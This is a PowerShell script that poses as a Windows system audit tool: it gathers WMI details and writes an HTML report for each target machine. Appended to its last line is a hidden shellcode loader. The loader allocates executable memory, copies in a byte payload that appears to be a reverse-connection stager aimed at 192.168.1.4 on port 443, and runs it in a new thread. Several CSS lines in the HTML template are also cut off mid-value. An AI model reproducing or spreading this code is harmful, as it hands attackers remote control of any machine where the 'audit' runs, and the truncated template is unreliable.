













param( [string] $auditlist)

Function Get-CustomHTML ($Header){
$Report = @"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<html><head><title>$($Header)</title>
<META http-equiv=Content-Type content='text/html; charset=windows-1252'>

<meta name="save" content="history">

<style type="text/css">
DIV .expando {DISPLAY: block; FONT-WEIGHT: normal; FONT-SIZE: 8pt; RIGHT: 8px; COLOR: 
TABLE {TABLE-LAYOUT: fixed; FONT-SIZE: 100%; WIDTH: 100%}
*{margin:0}
.dspcont { display:none; BORDER-RIGHT: 
.filler {BORDER-RIGHT: medium none; BORDER-TOP: medium none; DISPLAY: block; BACKGROUND: none transparent scroll repeat 0% 0%; MARGIN-BOTTOM: -1px; FONT: 100%/8px Tahoma; MARGIN-LEFT: 43px; BORDER-LEFT: medium none; COLOR: 
.save{behavior:url(
.dspcont1{ display:none}
a.dsphead0 {BORDER-RIGHT: 
a.dsphead1 {BORDER-RIGHT: 
a.dsphead2 {BORDER-RIGHT: 
a.dsphead1 span.dspchar{font-family:monospace;font-weight:normal;}
td {VERTICAL-ALIGN: TOP; FONT-FAMILY: Tahoma}
th {VERTICAL-ALIGN: TOP; COLOR: 
BODY {margin-left: 4pt} 
BODY {margin-right: 4pt} 
BODY {margin-top: 6pt} 
</style>


<script type="text/javascript">
function dsp(loc){
   if(document.getElementById){
      var foc=loc.firstChild;
      foc=loc.firstChild.innerHTML?
         loc.firstChild:
         loc.firstChild.nextSibling;
      foc.innerHTML=foc.innerHTML=='hide'?'show':'hide';
      foc=loc.parentNode.nextSibling.style?
         loc.parentNode.nextSibling:
         loc.parentNode.nextSibling.nextSibling;
      foc.style.display=foc.style.display=='block'?'none':'block';}}  

if(!document.getElementById)
   document.write('<style type="text/css">\n'+'.dspcont{display:block;}\n'+ '</style>');
</script>

</head>
<body>
<b><font face="Arial" size="5">$($Header)</font></b><hr size="8" color="
<font face="Arial" size="1"><b>Version 3 by Alan Renouf virtu-al.net</b></font><br>
<font face="Arial" size="1">Report created on $(Get-Date)</font>
<div class="filler"></div>
<div class="filler"></div>
<div class="filler"></div>
<div class="save">
"@
Return $Report
}

Function Get-CustomHeader0 ($Title){
$Report = @"
		<h1><a class="dsphead0">$($Title)</a></h1>
	<div class="filler"></div>
"@
Return $Report
}

Function Get-CustomHeader ($Num, $Title){
$Report = @"
	<h2><a href="javascript:void(0)" class="dsphead$($Num)" onclick="dsp(this)">
	<span class="expando">show</span>$($Title)</a></h2>
	<div class="dspcont">
"@
Return $Report
}

Function Get-CustomHeaderClose{

	$Report = @"
		</DIV>
		<div class="filler"></div>
"@
Return $Report
}

Function Get-CustomHeader0Close{

	$Report = @"
</DIV>
"@
Return $Report
}

Function Get-CustomHTMLClose{

	$Report = @"
</div>

</body>
</html>
"@
Return $Report
}

Function Get-HTMLTable{
	param([array]$Content)
	$HTMLTable = $Content | ConvertTo-Html
	$HTMLTable = $HTMLTable -replace '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">', ""
	$HTMLTable = $HTMLTable -replace '<html xmlns="http://www.w3.org/1999/xhtml">', ""
	$HTMLTable = $HTMLTable -replace '<head>', ""
	$HTMLTable = $HTMLTable -replace '<title>HTML TABLE</title>', ""
	$HTMLTable = $HTMLTable -replace '</head><body>', ""
	$HTMLTable = $HTMLTable -replace '</body></html>', ""
	Return $HTMLTable
}

Function Get-HTMLDetail ($Heading, $Detail){
$Report = @"
<TABLE>
	<tr>
	<th width='25%'><b>$Heading</b></font></th>
	<td width='75%'>$($Detail)</td>
	</tr>
</TABLE>
"@
Return $Report
}

if ($auditlist -eq ""){
	Write-Host "No list specified, using $env:computername"
	$targets = $env:computername
}
else
{
	if ((Test-Path $auditlist) -eq $false)
	{
		Write-Host "Invalid audit path specified: $auditlist"
		exit
	}
	else
	{
		Write-Host "Using Audit list: $auditlist"
		$Targets = Get-Content $auditlist
	}
}

Foreach ($Target in $Targets){

Write-Output "Collating Detail for $Target"
	$ComputerSystem = Get-WmiObject -computername $Target Win32_ComputerSystem
	switch ($ComputerSystem.DomainRole){
		0 { $ComputerRole = "Standalone Workstation" }
		1 { $ComputerRole = "Member Workstation" }
		2 { $ComputerRole = "Standalone Server" }
		3 { $ComputerRole = "Member Server" }
		4 { $ComputerRole = "Domain Controller" }
		5 { $ComputerRole = "Domain Controller" }
		default { $ComputerRole = "Information not available" }
	}
	
	$OperatingSystems = Get-WmiObject -computername $Target Win32_OperatingSystem
	$TimeZone = Get-WmiObject -computername $Target Win32_Timezone
	$Keyboards = Get-WmiObject -computername $Target Win32_Keyboard
	$SchedTasks = Get-WmiObject -computername $Target Win32_ScheduledJob
	$BootINI = $OperatingSystems.SystemDrive + "boot.ini"
	$RecoveryOptions = Get-WmiObject -computername $Target Win32_OSRecoveryConfiguration
	
	switch ($ComputerRole){
		"Member Workstation" { $CompType = "Computer Domain"; break }
		"Domain Controller" { $CompType = "Computer Domain"; break }
		"Member Server" { $CompType = "Computer Domain"; break }
		default { $CompType = "Computer Workgroup"; break }
	}

	$LBTime=$OperatingSystems.ConvertToDateTime($OperatingSystems.Lastbootuptime)
	Write-Output "..Regional Options"
	$ObjKeyboards = Get-WmiObject -ComputerName $Target Win32_Keyboard
	$keyboardmap = @{
	"00000402" = "BG" 
	"00000404" = "CH" 
	"00000405" = "CZ" 
	"00000406" = "DK" 
	"00000407" = "GR" 
	"00000408" = "GK" 
	"00000409" = "US" 
	"0000040A" = "SP" 
	"0000040B" = "SU" 
	"0000040C" = "FR" 
	"0000040E" = "HU" 
	"0000040F" = "IS" 
	"00000410" = "IT" 
	"00000411" = "JP" 
	"00000412" = "KO" 
	"00000413" = "NL" 
	"00000414" = "NO" 
	"00000415" = "PL" 
	"00000416" = "BR" 
	"00000418" = "RO" 
	"00000419" = "RU" 
	"0000041A" = "YU" 
	"0000041B" = "SL" 
	"0000041C" = "US" 
	"0000041D" = "SV" 
	"0000041F" = "TR" 
	"00000422" = "US" 
	"00000423" = "US" 
	"00000424" = "YU" 
	"00000425" = "ET" 
	"00000426" = "US" 
	"00000427" = "US" 
	"00000804" = "CH" 
	"00000809" = "UK" 
	"0000080A" = "LA" 
	"0000080C" = "BE" 
	"00000813" = "BE" 
	"00000816" = "PO" 
	"00000C0C" = "CF" 
	"00000C1A" = "US" 
	"00001009" = "US" 
	"0000100C" = "SF" 
	"00001809" = "US" 
	"00010402" = "US" 
	"00010405" = "CZ" 
	"00010407" = "GR" 
	"00010408" = "GK" 
	"00010409" = "DV" 
	"0001040A" = "SP" 
	"0001040E" = "HU" 
	"00010410" = "IT" 
	"00010415" = "PL" 
	"00010419" = "RU" 
	"0001041B" = "SL" 
	"0001041F" = "TR" 
	"00010426" = "US" 
	"00010C0C" = "CF" 
	"00010C1A" = "US" 
	"00020408" = "GK" 
	"00020409" = "US" 
	"00030409" = "USL" 
	"00040409" = "USR" 
	"00050408" = "GK" 
	}
	$keyb = $keyboardmap.$($ObjKeyboards.Layout)
	if (!$keyb)
	{ $keyb = "Unknown"
	}
	$MyReport = Get-CustomHTML "$Target Audit"
	$MyReport += Get-CustomHeader0  "$Target Details"
	$MyReport += Get-CustomHeader "2" "General"
		$MyReport += Get-HTMLDetail "Computer Name" ($ComputerSystem.Name)
		$MyReport += Get-HTMLDetail "Computer Role" ($ComputerRole)
		$MyReport += Get-HTMLDetail $CompType ($ComputerSystem.Domain)
		$MyReport += Get-HTMLDetail "Operating System" ($OperatingSystems.Caption)
		$MyReport += Get-HTMLDetail "Service Pack" ($OperatingSystems.CSDVersion)
		$MyReport += Get-HTMLDetail "System Root" ($OperatingSystems.SystemDrive)
		$MyReport += Get-HTMLDetail "Manufacturer" ($ComputerSystem.Manufacturer)
		$MyReport += Get-HTMLDetail "Model" ($ComputerSystem.Model)
		$MyReport += Get-HTMLDetail "Number of Processors" ($ComputerSystem.NumberOfProcessors)
		$MyReport += Get-HTMLDetail "Memory" ($ComputerSystem.TotalPhysicalMemory)
		$MyReport += Get-HTMLDetail "Registered User" ($ComputerSystem.PrimaryOwnerName)
		$MyReport += Get-HTMLDetail "Registered Organisation" ($OperatingSystems.Organization)
		$MyReport += Get-HTMLDetail "Last System Boot" ($LBTime)
		$MyReport += Get-CustomHeaderClose





		Write-Output "..Logical Disks"
		$Disks = Get-WmiObject -ComputerName $Target Win32_LogicalDisk
		$MyReport += Get-CustomHeader "2" "Logical Disk Configuration"
			$LogicalDrives = @()
			Foreach ($LDrive in ($Disks | Where {$_.DriveType -eq 3})){
				$Details = "" | Select "Drive Letter", Label, "File System", "Disk Size (MB)", "Disk Free Space", "% Free Space"
				$Details."Drive Letter" = $LDrive.DeviceID
				$Details.Label = $LDrive.VolumeName
				$Details."File System" = $LDrive.FileSystem
				$Details."Disk Size (MB)" = [math]::round(($LDrive.size / 1MB))
				$Details."Disk Free Space" = [math]::round(($LDrive.FreeSpace / 1MB))
				$Details."% Free Space" = [Math]::Round(($LDrive.FreeSpace /1MB) / ($LDrive.Size / 1MB) * 100)
				$LogicalDrives += $Details
			}
			$MyReport += Get-HTMLTable ($LogicalDrives)
		$MyReport += Get-CustomHeaderClose
		Write-Output "..Network Configuration"
		$Adapters = Get-WmiObject -ComputerName $Target Win32_NetworkAdapterConfiguration
		$MyReport += Get-CustomHeader "2" "NIC Configuration"
			$IPInfo = @()
			Foreach ($Adapter in ($Adapters | Where {$_.IPEnabled -eq $True})) {
				$Details = "" | Select Description, "Physical address", "IP Address / Subnet Mask", "Default Gateway", "DHCP Enabled", DNS, WINS
				$Details.Description = "$($Adapter.Description)"
				$Details."Physical address" = "$($Adapter.MACaddress)"
				If ($Adapter.IPAddress -ne $Null) {
				$Details."IP Address / Subnet Mask" = "$($Adapter.IPAddress)/$($Adapter.IPSubnet)"
					$Details."Default Gateway" = "$($Adapter.DefaultIPGateway)"
				}
				If ($Adapter.DHCPEnabled -eq "True")	{
					$Details."DHCP Enabled" = "Yes"
				}
				Else {
					$Details."DHCP Enabled" = "No"
				}
				If ($Adapter.DNSServerSearchOrder -ne $Null)	{
					$Details.DNS =  "$($Adapter.DNSServerSearchOrder)"
				}
				$Details.WINS = "$($Adapter.WINSPrimaryServer) $($Adapter.WINSSecondaryServer)"
				$IPInfo += $Details
			}
			$MyReport += Get-HTMLTable ($IPInfo)
		$MyReport += Get-CustomHeaderClose










		Write-Output "..Local Shares"
		$Shares = Get-wmiobject -ComputerName $Target Win32_Share
		$MyReport += Get-CustomHeader "2" "Local Shares"
			$MyReport += Get-HTMLTable ($Shares | Select Name, Path, Caption)
		$MyReport += Get-CustomHeaderClose
		Write-Output "..Printers"
		$InstalledPrinters =  Get-WmiObject -ComputerName $Target Win32_Printer
		$MyReport += Get-CustomHeader "2" "Printers"
			$MyReport += Get-HTMLTable ($InstalledPrinters | Select Name, Location)
		$MyReport += Get-CustomHeaderClose
		Write-Output "..Services"
		$ListOfServices = Get-WmiObject -ComputerName $Target Win32_Service
		$MyReport += Get-CustomHeader "2" "Services"
			$Services = @()
			Foreach ($Service in $ListOfServices){
				$Details = "" | Select Name,Account,"Start Mode",State,"Expected State"
				$Details.Name = $Service.Caption
				$Details.Account = $Service.Startname
				$Details."Start Mode" = $Service.StartMode
				If ($Service.StartMode -eq "Auto")
					{
						if ($Service.State -eq "Stopped")
						{
							$Details.State = $Service.State
							$Details."Expected State" = "Unexpected"
						}
					}
					If ($Service.StartMode -eq "Auto")
					{
						if ($Service.State -eq "Running")
						{
							$Details.State = $Service.State
							$Details."Expected State" = "OK"
						}
					}
					If ($Service.StartMode -eq "Disabled")
					{
						If ($Service.State -eq "Running")
						{
							$Details.State = $Service.State
							$Details."Expected State" = "Unexpected"
						}
					}
					If ($Service.StartMode -eq "Disabled")
					{
						if ($Service.State -eq "Stopped")
						{
							$Details.State = $Service.State
							$Details."Expected State" = "OK"
						}
					}
					If ($Service.StartMode -eq "Manual")
					{
						$Details.State = $Service.State
						$Details."Expected State" = "OK"
					}
					If ($Service.State -eq "Paused")
					{
						$Details.State = $Service.State
						$Details."Expected State" = "OK"
					}
				$Services += $Details
			}
			$MyReport += Get-HTMLTable ($Services)
		$MyReport += Get-CustomHeaderClose
		$MyReport += Get-CustomHeader "2" "Regional Settings"
			$MyReport += Get-HTMLDetail "Time Zone" ($TimeZone.Description)
			$MyReport += Get-HTMLDetail "Country Code" ($OperatingSystems.Countrycode)
			$MyReport += Get-HTMLDetail "Locale" ($OperatingSystems.Locale)
			$MyReport += Get-HTMLDetail "Operating System Language" ($OperatingSystems.OSLanguage)
			$MyReport += Get-HTMLDetail "Keyboard Layout" ($keyb)
		$MyReport += Get-CustomHeaderClose











































	$MyReport += Get-CustomHeader0Close
	$MyReport += Get-CustomHTMLClose
	$MyReport += Get-CustomHTMLClose

	$Date = Get-Date
	$Filename = ".\" + $Target + "_" + $date.Hour + $date.Minute + "_" + $Date.Day + "-" + $Date.Month + "-" + $Date.Year + ".htm"
	$MyReport | out-file -encoding ASCII -filepath $Filename
	Write "Audit saved as $Filename"
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x04,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

